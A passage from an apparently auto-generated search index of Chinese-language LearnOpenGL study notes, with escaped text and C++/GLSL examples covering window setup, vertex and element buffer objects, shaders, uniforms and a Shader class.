\u8bbe\u7f6e\u7a97\u53e3\u5173\u95ed\n}\n\nint main(void)\n{\n    glfwInit(); // \u521d\u59cb\u5316 glfw\n\n    // \u4f7f\u7528 glfwWindowHint \u51fd\u6570\u6765\u914d\u7f6eGLFW\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4ee3\u8868\u9009\u9879\u7684\u540d\u79f0\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u63a5\u53d7\u4e00\u4e2a\u6574\u5f62\uff0c\u7528\u6765\u8bbe\u7f6e\u8fd9\u4e2a\u9009\u9879\u7684\u503c\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3); // \u4e3b\u7248\u672c\u53f7\u4e3a 3\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3); // \u6b21\u7248\u672c\u53f7\u4e3a 3\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE); // \u4f7f\u7528\u6838\u5fc3\u6a21\u5f0f\n\n#ifdef __APPLE__\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE); // \u5bf9\u4e8e Mac OS X\uff0c\u9700\u8981\u8bbe\u7f6e\u8fd9\u4e2a\u9009\u9879\n#endif\n\n    GLFWwindow* window = glfwCreateWindow(800, 600, \"Hello, World!\", NULL, NULL); // \u521b\u5efa\u7a97\u53e3\n    if (window == NULL)\n    {\n        std::cout &lt;&lt; \"Failed to create a GLFW window\" &lt;&lt; \"\\n\";\n        glfwTerminate(); // \u7ec8\u6b62 glfw\n        return -1;\n    }\n    glfwMakeContextCurrent(window); // \u5c06\u7a97\u53e3\u7684\u4e0a\u4e0b\u6587\u8bbe\u7f6e\u4e3a\u5f53\u524d\u7ebf\u7a0b\u7684\u4e3b\u4e0a\u4e0b\u6587\n    glfwSetFramebufferSizeCallback(window, framebuffer_size_callback); // \u6bcf\u5f53\u7a97\u53e3\u8c03\u6574\u5927\u5c0f\u65f6\uff0c\u8c03\u7528\u56de\u8c03\u51fd\u6570\n\n    if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress)) // \u521d\u59cb\u5316 GLAD\n    {\n        std::cout &lt;&lt; \"Failed to initialize GLAD\" &lt;&lt; \"\\n\";\n        return -1;\n    }\n\n    // \u9876\u70b9\u7740\u8272\u5668\u7f16\u8bd1\n    unsigned int vertexShader; // \u7740\u8272\u5668\u5bf9\u8c61\u901a\u8fc7 ID \u6765\u5f15\u7528\uff0c\u56e0\u6b64\u5b9a\u4e49\u4e3a unsigned int\n    vertexShader = glCreateShader(GL_VERTEX_SHADER); // \u521b\u5efa\u4e00\u4e2a\u9876\u70b9\u7740\u8272\u5668\u5bf9\u8c61\n\n    glShaderSource(vertexShader, 1, &amp;vertexShaderSource, NULL); // \u628a\u7740\u8272\u5668\u6e90\u7801\u9644\u52a0\u5230\u7740\u8272\u5668\u5bf9\u8c61\u4e0a\n    glCompileShader(vertexShader); // \u7f16\u8bd1\u7740\u8272\u5668\n\n    // \u7247\u6bb5\u7740\u8272\u5668\u7f16\u8bd1\n    unsigned int fragmentShader; // \u521b\u5efa\u4e00\u4e2a\u7247\u6bb5\u7740\u8272\u5668\u5bf9\u8c61\n    fragmentShader = glCreateShader(GL_FRAGMENT_SHADER); // \u521b\u5efa\u4e00\u4e2a\u7247\u6bb5\u7740\u8272\u5668\u5bf9\u8c61\n\n    glShaderSource(fragmentShader, 1, &amp;fragmentShaderSource, NULL); // \u628a\u7740\u8272\u5668\u6e90\u7801\u9644\u52a0\u5230\u7740\u8272\u5668\u5bf9\u8c61\u4e0a\n    glCompileShader(fragmentShader); // \u7f16\u8bd1\u7740\u8272\u5668\n\n    // \u7740\u8272\u5668\u7a0b\u5e8f\n    unsigned int shaderProgram;\n    shaderProgram = glCreateProgram();\n\n    // \u628a\u7740\u8272\u5668\u9644\u52a0\u5230\u7a0b\u5e8f\u5bf9\u8c61\u4e0a\uff0c\u5e76\u94fe\u63a5\u5b83\u4eec\n    glAttachShader(shaderProgram, vertexShader);\n    glAttachShader(shaderProgram, fragmentShader);\n    glLinkProgram(shaderProgram);\n\n    glUseProgram(shaderProgram);\n\n    // \u5220\u9664\u7740\u8272\u5668\u5bf9\u8c61\n    glDeleteShader(vertexShader);\n    glDeleteShader(fragmentShader);\n\n    unsigned int VAO, VBO;\n    glGenVertexArrays(1, &amp;VAO); // \u751f\u6210\u4e00\u4e2a VAO \u5bf9\u8c61\n    glGenBuffers(1, &amp;VBO); // \u751f\u6210\u4e00\u4e2a VBO \u5bf9\u8c61\n\n    // ..:: \u521d\u59cb\u5316\u4ee3\u7801\uff08\u53ea\u8fd0\u884c\u4e00\u6b21 (\u9664\u975e\u4f60\u7684\u7269\u4f53\u9891\u7e41\u6539\u53d8)\uff09 :: ..\n    // 1. \u7ed1\u5b9aVAO\n    glBindVertexArray(VAO);\n    // 2. \u628a\u9876\u70b9\u6570\u7ec4\u590d\u5236\u5230\u7f13\u51b2\u4e2d\u4f9bOpenGL\u4f7f\u7528\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\n    glBufferData(GL_ARRAY_BUFFER, sizeof(vertices), vertices, GL_STATIC_DRAW);\n    // 3. \u8bbe\u7f6e\u9876\u70b9\u5c5e\u6027\u6307\u9488\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(float), (void*)0);\n    glEnableVertexAttribArray(0);\n\n    // render loop\n    while (!glfwWindowShouldClose(window)) // \u5f53\u7a97\u53e3\u6ca1\u6709\u5173\u95ed\u65f6\n    {\n        processInput(window); // \u5904\u7406\u8f93\u5165\n\n        // \u8bbe\u7f6e\u6bcf\u6b21\u5faa\u73af\u5f00\u59cb\u524d\u6e05\u7a7a\u4e0a\u4e00\u6b21\u8fed\u4ee3\u7684\u6e32\u67d3\u7ed3\u679c\n        glClearColor(0.2f, 0.3f, 0.3f, 1.0f); // \u8bbe\u7f6e\u6e05\u7a7a\u5c4f\u5e55\u6240\u7528\u7684\u989c\u8272\n        glClear(GL_COLOR_BUFFER_BIT); // \u6e05\u7a7a\u989c\u8272\u7f13\u51b2\n\n        /* \u6e32\u67d3\u6307\u4ee4 */\n        glUseProgram(shaderProgram);\n        glBindVertexArray(VAO);\n        glDrawArrays(GL_TRIANGLES, 0, 3);\n\n        glfwSwapBuffers(window); // \u4ea4\u6362\u989c\u8272\u7f13\u51b2\n        glfwPollEvents(); // \u68c0\u67e5\u6709\u6ca1\u6709\u89e6\u53d1\u4ec0\u4e48\u4e8b\u4ef6\n    }\n\n    glDeleteVertexArrays(1, &amp;VAO);\n    glDeleteBuffers(1, &amp;VBO);\n    glDeleteBuffers(1, &amp;EBO);\n    glDeleteProgram(shaderProgram);\n\n    glfwTerminate(); // \u7ec8\u6b62 glfw\uff0c\u91ca\u653e\u8d44\u6e90\n    return 0;\n}\n</code></pre>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#_6","title":"\u5143\u7d20\u7f13\u51b2\u5bf9\u8c61","text":"<p>\u5143\u7d20\u7f13\u51b2\u5bf9\u8c61\uff08Element Buffer Object\uff0cEBO\uff09\uff0c\u4e5f\u53eb\u7d22\u5f15\u7f13\u51b2\u5bf9\u8c61\uff08Index Buffer Object, IBO\uff09\u3002\u5047\u8bbe\u6211\u4eec\u60f3\u8981\u7ed8\u5236\u4e00\u4e2a\u7531\u4e24\u4e2a\u4e09\u89d2\u5f62\u7ec4\u6210\u7684\u77e9\u5f62\uff0c\u5176\u9876\u70b9\u96c6\u6709\u4ee5\u4e0b\u7ed3\u6784\uff1a</p> <pre><code>float vertices[] = {\n    // \u7b2c\u4e00\u4e2a\u4e09\u89d2\u5f62\n    0.5f, 0.5f, 0.0f,   // \u53f3\u4e0a\u89d2\n    0.5f, -0.5f, 0.0f,  // \u53f3\u4e0b\u89d2\n    -0.5f, 0.5f, 0.0f,  // \u5de6\u4e0a\u89d2\n    // \u7b2c\u4e8c\u4e2a\u4e09\u89d2\u5f62\n    0.5f, -0.5f, 0.0f,  // \u53f3\u4e0b\u89d2\n    -0.5f, -0.5f, 0.0f, // \u5de6\u4e0b\u89d2\n    -0.5f, 0.5f, 0.0f   // \u5de6\u4e0a\u89d2\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u53f3\u4e0b\u89d2\u548c\u5de6\u4e0a\u89d2\u7684\u4f4d\u7f6e\u5404\u81ea\u91cd\u590d\u5b9a\u4e49\u4e86\u4e24\u4e2a\u9876\u70b9\uff0c\u5b9e\u9645\u4e0a\u6211\u4eec\u53ea\u9700\u8981\u77e9\u5f62\u7684\u56db\u4e2a\u9876\u70b9\u5c31\u591f\u4e86\u3002\u89e3\u51b3\u65b9\u6cd5\u5c31\u662f\u53ea\u50a8\u5b58\u4e0d\u540c\u7684\u9876\u70b9\uff0c\u5e76\u8bbe\u5b9a\u7ed8\u5236\u8fd9\u4e9b\u9876\u70b9\u7684\u987a\u5e8f\uff0c\u8fd9\u5c31\u662f\u5143\u7d20\u7f13\u51b2\u533a\u5bf9\u8c61\u7684\u5de5\u4f5c\u65b9\u5f0f\u3002</p> <p>EBO \u662f\u4e00\u4e2a\u7f13\u51b2\u533a\uff0c\u5b83\u5b58\u50a8 OpenGL \u7528\u6765\u51b3\u5b9a\u8981\u7ed8\u5236\u54ea\u4e9b\u9876\u70b9\u7684\u7d22\u5f15\uff0c\u79f0\u4e3a\u7d22\u5f15\u7ed8\u5236\u3002</p> <pre><code>float vertices[] = {\n    0.5f, 0.5f, 0.0f,   // \u53f3\u4e0a\u89d2\n    0.5f, -0.5f, 0.0f,  // \u53f3\u4e0b\u89d2\n    -0.5f, -0.5f, 0.0f, // \u5de6\u4e0b\u89d2\n    -0.5f, 0.5f, 0.0f   // \u5de6\u4e0a\u89d2\n};\n\nunsigned int indices[] = {\n    // \u6ce8\u610f\u7d22\u5f15\u4ece0\u5f00\u59cb! \n    // \u6b64\u4f8b\u7684\u7d22\u5f15(0,1,2,3)\u5c31\u662f\u9876\u70b9\u6570\u7ec4vertices\u7684\u4e0b\u6807\uff0c\n    // \u8fd9\u6837\u53ef\u4ee5\u7531\u4e0b\u6807\u4ee3\u8868\u9876\u70b9\u7ec4\u5408\u6210\u77e9\u5f62\n\n    0, 1, 3, // \u7b2c\u4e00\u4e2a\u4e09\u89d2\u5f62\n    1, 2, 3  // \u7b2c\u4e8c\u4e2a\u4e09\u89d2\u5f62\n};\n</code></pre> <p>EBO \u7684\u521b\u5efa\u548c\u6570\u636e\u590d\u5236\u548c VBO \u7c7b\u4f3c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u5176\u7f13\u51b2\u7c7b\u578b\u5b9a\u4e49\u4e3a <code>GL_ELEMENT_ARRAY_BUFFER</code> \uff1a</p> <pre><code>unsigned int EBO;\nglGenBuffers(1, &amp;EBO);\n\nglBindBuffer(GL_ELEMENT_ARRAY_BUFFER, EBO);\nglBufferData(GL_ELEMENT_ARRAY_BUFFER, sizeof(indices), indices, GL_STATIC_DRAW);\n</code></pre> <p>\u540c\u6837\uff0cEBO \u53ef\u4ee5\u7ed1\u5b9a\u5728 EAO \u4e0a\uff0c\u4f7f\u7528 EBO \u7684\u521d\u59cb\u5316\u548c\u6e32\u67d3\u4ee3\u7801\u7ed3\u6784\u53ef\u4ee5\u7b80\u5316\u5982\u4e0b\uff1a</p> <pre><code>// ..:: \u521d\u59cb\u5316\u4ee3\u7801 :: ..\nunsigned int VAO, VBO, EBO;\nglGenVertexArrays(1, &amp;VAO); // \u751f\u6210\u4e00\u4e2a VAO \u5bf9\u8c61\nglGenBuffers(1, &amp;VBO); // \u751f\u6210\u4e00\u4e2a VBO \u5bf9\u8c61\nglGenBuffers(1, &amp;EBO); // \u751f\u6210\u4e00\u4e2a EBO \u5bf9\u8c61\n// 1. \u7ed1\u5b9a\u9876\u70b9\u6570\u7ec4\u5bf9\u8c61\nglBindVertexArray(VAO);\n// 2. \u628a\u6211\u4eec\u7684\u9876\u70b9\u6570\u7ec4\u590d\u5236\u5230\u4e00\u4e2a\u9876\u70b9\u7f13\u51b2\u4e2d\uff0c\u4f9bOpenGL\u4f7f\u7528\nglBindBuffer(GL_ARRAY_BUFFER, VBO);\nglBufferData(GL_ARRAY_BUFFER, sizeof(vertices), vertices, GL_STATIC_DRAW);\n// 3. \u590d\u5236\u6211\u4eec\u7684\u7d22\u5f15\u6570\u7ec4\u5230\u4e00\u4e2a\u7d22\u5f15\u7f13\u51b2\u4e2d\uff0c\u4f9bOpenGL\u4f7f\u7528\nglBindBuffer(GL_ELEMENT_ARRAY_BUFFER, EBO);\nglBufferData(GL_ELEMENT_ARRAY_BUFFER, sizeof(indices), indices, GL_STATIC_DRAW);\n// 4. \u8bbe\u5b9a\u9876\u70b9\u5c5e\u6027\u6307\u9488\nglVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(float), (void*)0);\nglEnableVertexAttribArray(0);\n\n[...]\n\n// ..:: \u7ed8\u5236\u4ee3\u7801\uff08\u6e32\u67d3\u5faa\u73af\u4e2d\uff09 :: ..\nglUseProgram(shaderProgram);\nglBindVertexArray(VAO);\nglDrawElements(GL_TRIANGLES, 6, GL_UNSIGNED_INT, 0);\nglBindVertexArray(0);\n</code></pre> <p>\u7528 <code>glDrawArrays</code> \u51fd\u6570\u8fbe\u6210\u540c\u6837\u6548\u679c</p> <pre><code>float vertices[] = {\n// \u7b2c\u4e00\u4e2a\u4e09\u89d2\u5f62\n0.5f, 0.5f, 0.0f,   // \u53f3\u4e0a\u89d2\n0.5f, -0.5f, 0.0f,  // \u53f3\u4e0b\u89d2\n-0.5f, 0.5f, 0.0f,  // \u5de6\u4e0a\u89d2\n// \u7b2c\u4e8c\u4e2a\u4e09\u89d2\u5f62\n0.5f, -0.5f, 0.0f,  // \u53f3\u4e0b\u89d2\n-0.5f, -0.5f, 0.0f, // \u5de6\u4e0b\u89d2\n-0.5f, 0.5f, 0.0f   // \u5de6\u4e0a\u89d2\n};\n// \u4ee3\u66ff glDrawElements(GL_TRIANGLES, 6, GL_UNSIGNED_INT, 0);\nglDrawArrays(GL_TRIANGLES, 0, 3); // \u7b2c\u4e00\u4e2a\u4e09\u89d2\u5f62\nglDrawArrays(GL_TRIANGLES, 3, 3); // \u7b2c\u4e8c\u4e2a\u4e09\u89d2\u5f62\n</code></pre>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#_7","title":"\u7740\u8272\u5668","text":"<p>\u5728\u4e09\u89d2\u5f62\u7ed8\u5236\u90e8\u5206\u4e2d\uff0c\u6211\u4eec\u53ea\u662f\u7b80\u5355\u7684\u5199\u4e86\u4e24\u4e2a\u6700\u57fa\u672c\u7684\u7740\u8272\u5668\u3002\u672c\u8282\u5c06\u4f1a\u66f4\u8be6\u7ec6\u5730\u4ecb\u7ecd\u5b83\u4eec\u3002</p>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#glsl","title":"GLSL","text":"<p>\u7740\u8272\u5668\u4f7f\u7528 GLSL \u8bed\u8a00\u7f16\u5199\uff0c\u5b83\u5305\u542b\u4e00\u4e9b\u9488\u5bf9\u5411\u91cf\u548c\u77e9\u9635\u64cd\u4f5c\u7684\u6709\u7528\u7279\u6027\u3002</p> <p>\u4e00\u4e2a\u5178\u578b\u7684\u7740\u8272\u5668\u6709\u5982\u4e0b\u7ed3\u6784\uff1a</p> <pre><code>#version version_number\nin type in_variable_name;\nin type in_variable_name;\n\nout type out_variable_name;\n\nuniform type uniform_name;\n\nvoid main()\n{\n  // \u5904\u7406\u8f93\u5165\u5e76\u8fdb\u884c\u4e00\u4e9b\u56fe\u5f62\u64cd\u4f5c\n  ...\n  // \u8f93\u51fa\u5904\u7406\u8fc7\u7684\u7ed3\u679c\u5230\u8f93\u51fa\u53d8\u91cf\n  out_variable_name = weird_stuff_we_processed;\n}\n</code></pre> <p>GLSL \u4e2d\u5305\u542b <code>int</code>,<code>float</code>,<code>double</code>,<code>uint</code>,<code>bool</code> \u7b49\u57fa\u7840\u6570\u636e\u7c7b\u578b\u3002\u5e76\u4e14\uff0c\u5b83\u62e5\u6709\u5411\u91cf\u548c\u77e9\u9635\u4e24\u79cd\u5bb9\u5668\u7c7b\u578b\u3002</p> <p>GLSL \u7684\u5411\u91cf\u662f\u4e00\u4e2a\u53ef\u4ee5\u5305\u542b 2,3\u62164 \u4e2a\u5206\u91cf\u7684\u5bb9\u5668\uff0c\u5206\u91cf\u7684\u6570\u636e\u7c7b\u578b\u53ef\u4ee5\u662f\u524d\u9762\u63d0\u5230\u7684\u4efb\u610f\u57fa\u7840\u6570\u636e\u7c7b\u578b\uff0c\u5199\u4f5c\u4e0b\u9762\u7684\u5f62\u5f0f\uff1a</p> \u7c7b\u578b \u542b\u4e49 <code>vecn</code> \u5305\u542b<code>n</code>\u4e2afloat\u5206\u91cf\u7684\u9ed8\u8ba4\u5411\u91cf <code>bvecn</code> \u5305\u542b<code>n</code>\u4e2abool\u5206\u91cf\u7684\u5411\u91cf <code>ivecn</code> \u5305\u542b<code>n</code>\u4e2aint\u5206\u91cf\u7684\u5411\u91cf <code>uvecn</code> \u5305\u542b<code>n</code>\u4e2aunsigned int\u5206\u91cf\u7684\u5411\u91cf <code>dvecn</code> \u5305\u542b<code>n</code>\u4e2adouble\u5206\u91cf\u7684\u5411\u91cf <p>\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c<code>vecn</code> \u5c31\u53ef\u4ee5\u6ee1\u8db3\u8981\u6c42</p> <p>\u5411\u91cf\u4e00\u4e9b\u64cd\u4f5c\u5982\u4e0b\uff1a</p> <pre><code>// vec4 vec = (vec.x, vec.y, vec.z, vec.w)\nvec2 someVec;\nvec4 differentVec = someVec.xyxx;\nvec3 anotherVec = differentVec.zyw;\nvec4 otherVec = someVec.xxxx + anotherVec.yxzy;\n\nvec2 vect = vec2(0.5, 0.7);\nvec4 result = vec4(vect, 0.0, 0.0);\nvec4 otherResult = vec4(result.xyz, 1.0);\n</code></pre> <p><code>in</code> \u548c <code>out</code> \u5173\u952e\u5b57\u4e13\u95e8\u7528\u4e8e\u5b9e\u73b0\u7740\u8272\u5668\u7684\u8f93\u5165\u548c\u8f93\u51fa\uff0c\u53ea\u8981\u4e00\u4e2a\u8f93\u51fa\u53d8\u91cf\u7684\u7c7b\u578b\u548c\u540d\u79f0\u548c\u4e0b\u4e00\u9636\u6bb5\u7684\u7740\u8272\u5668\u8f93\u5165\u5339\u914d\uff0c\u8be5\u53d8\u91cf\u5c31\u4f1a\u4e00\u76f4\u4f20\u9012\u4e0b\u53bb\u3002\u4f46\u5728\u9876\u70b9\u548c\u7247\u6bb5\u7740\u8272\u5668\u4e2d\u7565\u6709\u4e0d\u540c\u3002</p> <p>\u9876\u70b9\u7740\u8272\u5668\u63a5\u6536\u7279\u6b8a\u5f62\u5f0f\u7684\u8f93\u5165\uff0c\u5b83\u4ece\u9876\u70b9\u6570\u636e\u4e2d\u76f4\u63a5\u63a5\u6536\u8f93\u5165\uff0c\u6211\u4eec\u4f7f\u7528 <code>location</code> \u5143\u6570\u636e\u6765\u7ba1\u7406\u9876\u70b9\u6570\u636e\u3002\u56e0\u6b64\uff0c\u9876\u70b9\u7740\u8272\u5668\u9700\u8981\u4e3a\u5b83\u7684\u8f93\u5165\u63d0\u4f9b\u4e00\u4e2a\u989d\u5916\u7684 <code>layout</code> \u6807\u8bc6\uff0c\u4f7f\u5f97\u94fe\u63a5\u9636\u6bb5\u80fd\u591f\u5c06\u5176\u94fe\u63a5\u5230\u9876\u70b9\u6570\u636e\u3002</p> <p>\u7247\u6bb5\u7740\u8272\u5668\u9700\u8981\u4e00\u4e2a <code>vec4</code> \u7684\u8f93\u51fa\u53d8\u91cf\uff0c\u5982\u679c\u6ca1\u6709\u5b9a\u4e49\u989c\u8272\u8f93\u51fa\uff0c\u5219\u9ed8\u8ba4\u6e32\u67d3\u4e3a\u9ed1\u8272</p> <p>\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u7a0d\u5fae\u6539\u52a8\u4ee5\u4e0b\u524d\u9762\u5b9a\u4e49\u7684\u7740\u8272\u5668\uff0c\u5c55\u793a\u7740\u8272\u5668\u4e4b\u95f4\u7684\u6570\u636e\u4ea4\u6d41\uff1a</p> <pre><code>// vertex shader\n#version 330 core\nlayout (location = 0) in vec3 aPos; // \u4f4d\u7f6e\u53d8\u91cf\u7684\u5c5e\u6027\u4f4d\u7f6e\u503c\u4e3a0\n\nout vec3 vertexColor; // \u4e3a\u7247\u6bb5\u7740\u8272\u5668\u6307\u5b9a\u4e00\u4e2a\u989c\u8272\u8f93\u51fa\n\nvoid main()\n{\n    gl_Position = vec4(aPos, 1.0);\n    vertexColor = vec3(0.5, 0.0, 0.0); // \u628a\u8f93\u51fa\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u6697\u7ea2\u8272\n}\n\n\n\n// fragment shader\n#version 330 core\nout vec4 FragColor;\n\nin vec3 vertexColor; // \u4ece\u9876\u70b9\u7740\u8272\u5668\u4f20\u6765\u7684\u8f93\u5165\u53d8\u91cf\uff08\u540d\u79f0\u76f8\u540c\u3001\u7c7b\u578b\u76f8\u540c\uff09\n\nvoid main()\n{\n    FragColor = vec4(vertexColor, 1.0f);\n}\n</code></pre> <p>Uniform \u662f\u53e6\u4e00\u79cd\u4ece\u6211\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u5728 CPU \u4e0a\u4f20\u9012\u6570\u636e\u5230 GPU \u4e0a\u7684\u7740\u8272\u5668\u7684\u65b9\u5f0f\uff0c\u5b83\u662f\u4e00\u79cd\u5168\u5c40\u53d8\u91cf\uff0c\u5fc5\u987b\u5728\u6bcf\u4e2a\u7740\u8272\u5668\u7a0b\u5e8f\u5bf9\u8c61\u4e2d\u90fd\u662f\u72ec\u4e00\u65e0\u4e8c\u7684\uff0c\u800c\u4e14\u5b83\u53ef\u4ee5\u88ab\u7740\u8272\u5668\u7a0b\u5e8f\u7684\u4efb\u610f\u7740\u8272\u5668\u5728\u4efb\u610f\u9636\u6bb5\u8bbf\u95ee\u3002\u65e0\u8bba\u4f60\u628a uniform \u503c\u8bbe\u7f6e\u6210\u4ec0\u4e48\uff0cuniform \u4f1a\u4e00\u76f4\u4fdd\u5b58\u5b83\u4eec\u7684\u6570\u636e\uff0c\u76f4\u5230\u5b83\u4eec\u88ab\u91cd\u7f6e\u6216\u66f4\u65b0\u3002</p> <pre><code>#version 330 core\nout vec4 FragColor;\n\nuniform vec4 ourColor; // \u5728OpenGL\u7a0b\u5e8f\u4ee3\u7801\u4e2d\u8bbe\u5b9a\u8fd9\u4e2a\u53d8\u91cf\n\nvoid main()\n{\n    FragColor = ourColor;\n}\n</code></pre> <p>\u56e0\u4e3a uniform \u662f\u5168\u5c40\u53d8\u91cf\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4efb\u4f55\u7740\u8272\u5668\u4e2d\u5b9a\u4e49\u5b83\u4eec\uff0c\u800c\u65e0\u9700\u901a\u8fc7\u9876\u70b9\u7740\u8272\u5668\u4f5c\u4e3a\u4e2d\u4ecb\u3002\u9876\u70b9\u7740\u8272\u5668\u4e2d\u4e0d\u9700\u8981\u8fd9\u4e2a uniform\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u7528\u5728\u90a3\u91cc\u5b9a\u4e49\u5b83\u3002</p> <p>\u9759\u9ed8\u79fb\u9664</p> <p>\u5982\u679c\u4f60\u58f0\u660e\u4e86\u4e00\u4e2a uniform \u5374\u5728GLSL\u4ee3\u7801\u4e2d\u6ca1\u7528\u8fc7\uff0c\u7f16\u8bd1\u5668\u4f1a\u9759\u9ed8\u79fb\u9664\u8fd9\u4e2a\u53d8\u91cf\uff0c\u5bfc\u81f4\u6700\u540e\u7f16\u8bd1\u51fa\u7684\u7248\u672c\u4e2d\u5e76\u4e0d\u4f1a\u5305\u542b\u5b83\uff0c\u8fd9\u53ef\u80fd\u5bfc\u81f4\u51e0\u4e2a\u975e\u5e38\u9ebb\u70e6\u7684\u9519\u8bef\uff0c\u8bb0\u4f4f\u8fd9\u70b9\uff01</p> <p>\u8fd9\u4e2a uniform \u73b0\u5728\u8fd8\u662f\u7a7a\u7684\uff1b\u6211\u4eec\u8fd8\u6ca1\u6709\u7ed9\u5b83\u6dfb\u52a0\u4efb\u4f55\u6570\u636e\uff0c\u6240\u4ee5\u4e0b\u9762\u6211\u4eec\u5c31\u505a\u8fd9\u4ef6\u4e8b\u3002\u6211\u4eec\u9996\u5148\u9700\u8981\u627e\u5230\u7740\u8272\u5668\u4e2d uniform \u5c5e\u6027\u7684\u7d22\u5f15/\u4f4d\u7f6e\u503c\u3002\u5f53\u6211\u4eec\u5f97\u5230 uniform \u7684\u7d22\u5f15/\u4f4d\u7f6e\u503c\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u66f4\u65b0\u5b83\u7684\u503c\u4e86\u3002\u8fd9\u6b21\u6211\u4eec\u4e0d\u53bb\u7ed9\u50cf\u7d20\u4f20\u9012\u5355\u72ec\u4e00\u4e2a\u989c\u8272\uff0c\u800c\u662f\u8ba9\u5b83\u968f\u7740\u65f6\u95f4\u6539\u53d8\u989c\u8272\uff1a</p> <pre><code>float timeValue = glfwGetTime();\nfloat greenValue = (sin(timeValue) / 2.0f) + 0.5f;\nint vertexColorLocation = glGetUniformLocation(shaderProgram, \"ourColor\");\nglUseProgram(shaderProgram);\nglUniform4f(vertexColorLocation, 0.0f, greenValue, 0.0f, 1.0f);\n</code></pre> <p>\u9996\u5148\u6211\u4eec\u901a\u8fc7 <code>glfwGetTime</code> \u51fd\u6570\u83b7\u53d6\u8fd0\u884c\u7684\u79d2\u6570\u3002\u7136\u540e\u6211\u4eec\u4f7f\u7528sin\u51fd\u6570\u8ba9\u989c\u8272\u5728 0.0 \u5230 1.0 \u4e4b\u95f4\u6539\u53d8\uff0c\u6700\u540e\u5c06\u7ed3\u679c\u50a8\u5b58\u5230 greenValue \u91cc\u3002</p> <p>\u63a5\u7740\uff0c\u6211\u4eec\u7528 <code>glGetUniformLocation</code> \u67e5\u8be2 <code>uniform\u00a0ourColor</code> \u7684\u4f4d\u7f6e\u503c\u3002\u6211\u4eec\u4e3a\u67e5\u8be2\u51fd\u6570\u63d0\u4f9b\u7740\u8272\u5668\u7a0b\u5e8f\u548c uniform \u7684\u540d\u5b57\u3002\u5982\u679c <code>glGetUniformLocation</code> \u8fd4\u56de <code>-1</code> \u5c31\u4ee3\u8868\u6ca1\u6709\u627e\u5230\u8fd9\u4e2a\u4f4d\u7f6e\u503c\u3002\u6700\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 <code>glUniform4f</code> \u51fd\u6570\u8bbe\u7f6e uniform \u503c\u3002\u6ce8\u610f\uff0c\u67e5\u8be2 uniform \u5730\u5740\u4e0d\u8981\u6c42\u4f60\u4e4b\u524d\u4f7f\u7528\u8fc7\u7740\u8272\u5668\u7a0b\u5e8f\uff0c\u4f46\u662f\u66f4\u65b0\u4e00\u4e2a uniform \u4e4b\u524d\u4f60\u5fc5\u987b\u5148\u4f7f\u7528\u7a0b\u5e8f\uff08\u8c03\u7528glUseProgram)\uff0c\u56e0\u4e3a\u5b83\u662f\u5728\u5f53\u524d\u6fc0\u6d3b\u7684\u7740\u8272\u5668\u7a0b\u5e8f\u4e2d\u8bbe\u7f6e uniform \u7684\u3002</p>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#_8","title":"\u7740\u8272\u5668\u7c7b","text":"<pre><code>// shader_s.hpp\n\n#ifndef SHADER_H\n#define SHADER_H\n\n#include &lt;glad/glad.h&gt;\n\n#include &lt;string&gt;\n#include &lt;fstream&gt;\n#include &lt;sstream&gt;\n#include &lt;iostream&gt;\n\nclass Shader\n{\npublic:\n    unsigned int ID;\n    // constructor generates the shader on the fly\n    // ------------------------------------------------------------------------\n    Shader(const char* vertexPath, const char* fragmentPath)\n    {\n        // 1. retrieve the vertex/fragment source code from filePath\n        std::string vertexCode;\n        std::string fragmentCode;\n        std::ifstream vShaderFile;\n        std::ifstream fShaderFile;\n        // ensure ifstream objects can throw exceptions:\n        vShaderFile.exceptions(std::ifstream::failbit | std::ifstream::badbit);\n        fShaderFile.exceptions(std::ifstream::failbit | std::ifstream::badbit);\n        try\n        {\n            // open files\n            vShaderFile.open(vertexPath);\n            fShaderFile.open(fragmentPath);\n            std::stringstream vShaderStream, fShaderStream;\n            // read file's buffer contents into streams\n            vShaderStream &lt;&lt; vShaderFile.rdbuf();\n            fShaderStream &lt;&lt; fShaderFile.rdbuf();\n            // close file handlers\n            vShaderFile.close();\n            fShaderFile.close();\n            // convert stream into string\n            vertexCode = vShaderStream.str();\n            fragmentCode = fShaderStream.str();\n        }\n        catch (std::ifstream::failure&amp; e)\n        {\n            std::cout &lt;&lt; \"ERROR::SHADER::FILE_NOT_SUCCESSFULLY_READ: \" &lt;&lt; e.what() &lt;&lt; std::endl;\n        }\n        const char* vShaderCode = vertexCode.c_str();\n        const char* fShaderCode = fragmentCode.c_str();\n        // 2. compile shaders\n        unsigned int vertex, fragment;\n        // vertex shader\n        vertex = glCreateShader(GL_VERTEX_SHADER);\n        glShaderSource(vertex, 1, &amp;vShaderCode, NULL);\n        glCompileShader(vertex);\n        checkCompileErrors(vertex, \"VERTEX\");\n        // fragment Shader\n        fragment = glCreateShader(GL_FRAGMENT_SHADER);\n        glShaderSource(fragment, 1, &amp;fShaderCode, NULL);\n        glCompileShader(fragment);\n        checkCompileErrors(fragment, \"FRAGMENT\");\n        // shader Program\n        ID = glCreateProgram();\n        